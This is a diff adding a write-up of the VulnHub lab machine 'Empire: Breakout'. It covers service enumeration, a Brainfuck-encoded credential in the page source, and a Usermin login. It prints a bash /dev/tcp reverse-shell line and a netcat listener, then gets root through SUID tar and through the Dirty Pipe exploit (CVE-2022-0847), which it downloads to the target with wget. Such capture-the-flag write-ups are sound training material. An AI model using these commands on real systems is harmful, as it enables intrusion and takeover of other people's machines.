@@ -1,0 +1,295 @@
+---
+title: "Empire: Breakout"
+platform: "VulnHub"
+difficulty: "Easy"
+os: "Linux"
+date: "2026-05-31"
+tags: ["linux", "usermin", "smb", "brainfuck", "suid", "dirty-pipe", "privilege-escalation"]
+description: "A VulnHub machine with exposed Usermin and Webmin admin panels. Credentials are obfuscated as brainfuck in the page source. Got root two ways: abusing SUID tar to read an old password file, and the Dirty Pipe kernel exploit (CVE-2022-0847)."
+status: "in-progress"
+---
+
+The end goal of this challenge is to get root access and capture the flag.
+I was able to get root **two different ways** — I'll cover both: the intended path the machine author designed, and an alternative kernel exploit path.
+
+---
+
+## 1. Information Gathering
+
+### Nmap
+
+Started with an aggressive scan to identify open ports and running services.
+
+<TerminalOutput
+  cmd="nmap -A -T5 10.0.0.62"
+  rawHref="/writeups/raw/breakout/nmapsv.txt"
+  output={`PORT      STATE SERVICE     VERSION
+80/tcp    open  http        Apache httpd 2.4.51 ((Debian))
+|_http-title: Apache2 Debian Default Page: It works
+139/tcp   open  netbios-ssn Samba smbd 4
+445/tcp   open  netbios-ssn Samba smbd 4
+10000/tcp open  http        MiniServ 1.981 (Webmin httpd)
+20000/tcp open  http        MiniServ 1.830 (Webmin httpd)
+
+|_nbstat: NetBIOS name: BREAKOUT
+| smb2-security-mode:
+|_  Message signing enabled but not required`}
+/>
+
+Flags used:
+- `-A` — combines `-sV` (service version), `-sC` (default scripts), and `-O` (OS detection)
+- `-T5` — aggressive timing template for speed
+
+The server is running multiple services worth enumerating. Let's also run a vulnerability script scan to see if any of these are directly exploitable.
+
+<TerminalOutput
+  cmd="nmap --script vuln 10.0.0.62"
+  rawHref="/writeups/raw/breakout/nmapvuln.txt"
+  output={`80/tcp    open  http
+| http-csrf:
+|   Found possible CSRF vulnerabilities in /manual/ pages
+| http-enum:
+|_  /manual/: Potentially interesting folder
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+10000/tcp open  snet-sensor-mgmt
+20000/tcp open  dnp`}
+/>
+
+---
+
+## 2. HTTP Enumeration (Port 80)
+
+The website is running a default Apache2 page. Nothing deployed here — or so it seems.
+
+<Screenshot
+  src="/screenshots/breakout/nmap-sv-scan.png"
+  alt="nmap -sV scan output"
+  caption="Service version scan — two Webmin instances stand out"
+/>
+
+Let's run dirb to find any hidden directories.
+
+<TerminalOutput
+  cmd="dirb http://10.0.0.62/"
+  rawHref="/writeups/raw/breakout/dirbrepo.txt"
+  output={`+ http://10.0.0.62/index.html  (CODE:200|SIZE:11159)
+==> DIRECTORY: http://10.0.0.62/manual/
++ http://10.0.0.62/server-status  (CODE:403|SIZE:274)`}
+/>
+
+<TerminalOutput
+  cmd="nikto -h http://10.0.0.62"
+  rawHref="/writeups/raw/breakout/nikto.txt"
+  output={`+ Server: Apache/2.4.51 (Debian)
++ Apache/2.4.51 appears to be outdated (current is at least 2.4.66).
++ /: Server may leak inodes via ETags (CVE-2003-1418)
++ /manual/: Web server manual found.
++ /manual/images/: Directory indexing found.`}
+/>
+
+Nothing interesting in the directories. But notice that `index.html` is **11,159 bytes** — the default Apache page is around 3KB. Something has been added to it.
+
+Looking at the page source, there's a comment buried at the bottom:
+
+<TerminalOutput
+  cmd="view-source:http://10.0.0.62/index.html"
+  rawHref="/writeups/raw/breakout/indexpagebf.txt"
+  output={`++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>++++++++++++++++.++++.>>+++++++++++++++++.----.<++++++++++.-----------.>-----------.++++.<<+.>-.--------.++++++++++++++++++++.<------------.>>---------.<<++++++.++++++.`}
+/>
+
+Oh look at that — this is **Brainfuck**, yep, that's the name of a programming language.
+
+Decoding that gave me:
+
+```
+.2uqPEfj3D<P'a-3
+```
+
+Hmm... is this ROT13? Let me check. Seems not — this looks like it's already the actual credential. Keeping it.
+
+---
+
+## 3. SMB Enumeration (Ports 139 / 445)
+
+I always start by listing any shares I can access anonymously.
+
+<TerminalOutput
+  cmd="smbclient -L //10.0.0.62/"
+  rawHref="/writeups/raw/breakout/smbclientlisting.txt"
+  output={`Sharename    Type    Comment
+---------    ----    -------
+print$       Disk    Printer Drivers
+IPC$         IPC     IPC Service (Samba 4.13.5-Debian)`}
+/>
+
+Only default shares. No anonymous access to anything useful. The decoded string above could be a password — so I need a username. Let's use **enum4linux** to enumerate users.
+
+<TerminalOutput
+  cmd="enum4linux 10.0.0.62"
+  rawHref="/writeups/raw/breakout/enum4linux.txt"
+  output={`[+] Got domain/workgroup name: WORKGROUP
+
+ =========================================( Users on 10.0.0.62 )=========================================
+
+[+] Got OS info: Samba 4.13.5-Debian
+
+ ===================================( Share Enumeration )===================================
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        print$          Disk      Printer Drivers
+        IPC$            IPC       IPC Service
+
+[+] NBTStat: BREAKOUT <00> Workstation Service`}
+/>
+
+<Note type="tip">
+  enum4linux revealed the machine hostname is **BREAKOUT** and the Samba version is 4.13.5-Debian. Now let's confirm the exact SMB version with Metasploit.
+</Note>
+
+<TerminalOutput
+  cmd="msf > use auxiliary/scanner/smb/smb_version → run"
+  rawHref="/writeups/raw/breakout/smbversionmsf.txt"
+  output={`[*] 10.0.0.62:445 - SMB Detected (versions: 2, 3) (preferred dialect: SMB 3.1.1)
+[+] 10.0.0.62:445 -   Host is running Version 6.1.0 (unknown OS)
+[*] 10.0.0.62:445 -   SMB signing is not required`}
+/>
+
+I tried logging in via `psexec` and `smb_login` using the username `cyber` and the brainfuck-decoded password. I was able to authenticate successfully, but this didn't give me a shell — SMB isn't the path in.
+
+---
+
+## 4. Webmin / Usermin (Ports 10000 & 20000)
+
+<TerminalOutput
+  cmd="nikto -h http://10.0.0.62:10000"
+  rawHref="/writeups/raw/breakout/niktowebmin10k.txt"
+  output={`+ Server: MiniServ/1.981
++ [800125] /: Webmin Unix administrator interface — should not be running unless required.
++ [002739] /.htpasswd: Contains authorization information.
++ [002743] /.bash_history: Shell history accessible from web root.
++ [002756] /.sh_history: Shell history accessible.`}
+/>
+
+Webmin on port 10000 is interesting. Nmap flagged it as potentially vulnerable, and I tried several known Metasploit modules and Python exploit scripts — but the machine author switched it to HTTPS which blocks the known unauthenticated exploits. Dead end for now.
+
+Let's try **port 20000** (Usermin) with the credentials we decoded from brainfuck — username `cyber`, password `.2uqPEfj3D<P'a-3`.
+
+**Et la voilà!**
+
+Usermin at `:20000` accepts the login. Usermin is a stripped-down version of Webmin scoped to a single user account — but it still has a **Command Shell** module.
+
+---
+
+## 5. Foothold — Reverse Shell via Usermin
+
+From the Usermin Command Shell, craft a reverse netcat shell. You can generate one at [revshells.com](https://revshells.com) — set your Kali IP and a free port (I used 4444).
+
+```bash
+bash -c 'bash -i >& /dev/tcp/YOUR_KALI_IP/4444 0>&1'
+```
+
+Set up your listener first:
+
+```bash
+nc -lvnp 4444
+```
+
+<Screenshot
+  src="/screenshots/breakout/getting-shell-netcat.png"
+  alt="Netcat listener catches the reverse shell triggered from Usermin"
+  caption="Shell caught — we are now user 'cyber' on the box"
+/>
+
+And right there — first flag:
+
+<Note type="flag">
+  **user.txt** — `3mp!r3{"{"}You_Manage_To_Break_To_My_Secure_Access{"}"}`
+</Note>
+
+---
+
+## 6. Privilege Escalation — Path 1: SUID tar + Old Password File
+
+### Finding SUID Binaries
+
+<Screenshot
+  src="/screenshots/breakout/suid-search.png"
+  alt="find / -perm -u=s -type f 2>/dev/null"
+  caption="Searching for SUID-set binaries"
+/>
+
+<Screenshot
+  src="/screenshots/breakout/tar-suid.png"
+  alt="tar binary has the SUID bit set"
+  caption="tar has SUID — as any user, it runs with root privileges"
+/>
+
+`tar` has the SUID bit. Normally you can't directly get a shell from SUID tar, but you **can** use it to read files owned by root.
+
+### Finding the Backup
+
+<Screenshot
+  src="/screenshots/breakout/found-backups-folder.png"
+  alt="Discovered a backups directory containing .old_pass"
+  caption="There's a .old_pass file inside the backups folder — unreadable as cyber"
+/>
+
+After navigating around the filesystem, there's a backup file called `.old_pass` that the `cyber` user can't read directly. But with SUID tar, we can compress it and read its contents:
+
+<Screenshot
+  src="/screenshots/breakout/tar-read-oldbak.png"
+  alt="Using SUID tar to compress old_pass and read its contents"
+  caption="tar -czf /tmp/bak.tar /path/to/.old_pass — then extract and read"
+/>
+
+<Screenshot
+  src="/screenshots/breakout/privesc-old-backup-pass.png"
+  alt="Plaintext root password found inside .old_pass"
+  caption="Plaintext root credentials inside the backup"
+/>
+
+The backup contains the root password in plaintext. Running `su root` with that password gets us a root shell.
+
+<Note type="flag">
+  **root.txt** — `3mp!r3{"{"}You_Manage_To_BreakOut_From_My_System_Congratulation{"}"}`
+</Note>
+
+---
+
+## 7. Privilege Escalation — Path 2: Dirty Pipe (CVE-2022-0847)
+
+The kernel version running on this machine is vulnerable to the **Dirty Pipe** exploit. This is an alternative path to root without needing the backup file.
+
+Using [AlexisAhmed's CVE-2022-0847 exploit](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits), cloned to our Kali machine and compiled with `-static`:
+
+```bash
+gcc -o dirtypipe exploit.c -static
+```
+
+<Note type="note">
+  The `-static` flag bundles all library dependencies (like `libc`) directly into the binary. This is necessary because the `cyber` user doesn't have `gcc` on the target — we compile on our machine and transfer the pre-built binary. Static compilation removes the target's dependency on its own `/lib/x86_64-linux-gnu/libc.so.6`.
+</Note>
+
+<Screenshot
+  src="/screenshots/breakout/wget-dirtypipe.png"
+  alt="Transferring the compiled dirty pipe exploit to the target via wget"
+  caption="wget http://KALI_IP:8000/dirtypipe — pulling the binary from our HTTP server"
+/>
+
+<Screenshot
+  src="/screenshots/breakout/privesc-dirtypipe.png"
+  alt="Running the dirty pipe exploit to escalate to root"
+  caption="CVE-2022-0847 Dirty Pipe — overwrites a SUID binary to spawn a root shell"
+/>
+
+You can use any shell as the target — `/bin/bash` or `/bin/sh` will both work.
+
+<Note type="warning">
+  The Dirty Pipe path is noisier than Path 1 — it modifies a SUID binary on disk (temporarily). Path 1 via the backup password is cleaner and is the intended route the machine author designed.
+</Note>
+
+---
+
+*Writeup in progress — screenshots for the Usermin login and flag captures coming soon.*
